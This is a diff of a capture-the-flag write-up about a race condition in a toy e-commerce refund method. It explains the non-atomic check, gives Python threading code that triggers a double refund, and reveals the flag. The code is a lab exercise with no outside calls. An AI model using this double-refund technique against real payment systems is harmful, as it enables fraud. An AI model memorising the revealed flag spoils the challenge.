@@ -1116,55 +1116,70 @@ if not self.refunded:
 
 ### Exploitation Steps
 
-1. **Run the script
-    Use this command:
+1. **Understand the vulnerable logic**
+    - The `request_refund()` method checks if `self.refunded == False`.
+    - If true, it sets `self.refunded = True` and credits the user's balance.
+    - This logic is not atomic, making it vulnerable to race conditions during concurrent access.
     
-    ```bash
-	┌──(mopsy㉿APHP)-[~/H4K-IT]
-	└─$ python3 ecommerce_refund.py
+2. **Simulate a user placing an order**
+    
+    ```python
+    john = User("john")
+    o1 = john.place_order("ORD123", 100)
     ```
     
-2. **Observe the output**  
-    You should see:
+3. **Exploit the race condition using threads**
     
-    ```
-	[ORD123] Placed for $100
-	[ORD123] Refunded $100
-	[ORD123] Already refunded
-	Final balance: $100
-    ```
-    
-    Despite the "Already refunded" message, the balance increases by **$200**, proving that **two refunds were issued** for the same order.
-    
-3. **(Optional) Simulate a race condition using threads**  
-    Replace the refund logic with a threaded simulation to mimic concurrent requests:
+    - Launch two threads that call `order.request_refund()` at the same time:
     
     ```python
     import threading
     
-    def spam_refund(order):
-        for _ in range(2):
-            order.request_refund()
+    def refund_twice(order):
+        t1 = threading.Thread(target=order.request_refund)
+        t2 = threading.Thread(target=order.request_refund)
+        t1.start()
+        t2.start()
+        t1.join()
+        t2.join()
     
-    john = User("john")
-    o1 = john.place_order("ORD124", 150)
+    refund_twice(o1)
+    ```
     
-    t1 = threading.Thread(target=spam_refund, args=(o1,))
-    t2 = threading.Thread(target=spam_refund, args=(o1,))
-    t1.start()
-    t2.start()
-    t1.join()
-    t2.join()
+4. **Check the final balance**
     
+    - Print the final balance to see if the refund was issued more than once:
+        
+    
+    ```python
     print(f"Final balance: ${john.balance}")
     ```
     
-4. **Rerun the script**  
-    Observe if the final balance increases beyond the expected single refund, confirming a **race condition exploit** in a multi-threaded or real-world API environment.
+5. **Observe the output**
+    
+    - If the exploit worked, the console will show:
+        
+    
+    ```
+    [ORD123] Placed for $100
+    [ORD123] Refunded $100
+    [ORD123] Refunded $100
+    Final balance: $200
+    ```
+    
+6. **Capture the flag**
+    
+    - The vulnerable method responsible for this flaw is:
+        
+        ```
+        h4kit{order.request_refund()}
+        ```
+        
 
 ---
 
-Let me know if you'd like this compiled into a full Markdown write-up or submitted somewhere!
+Let me know if you'd like me to insert this directly into the full write-up or export it!
+
 
 ### 🚩Flag Captured: `h4kit{order.request_refund()}`
 
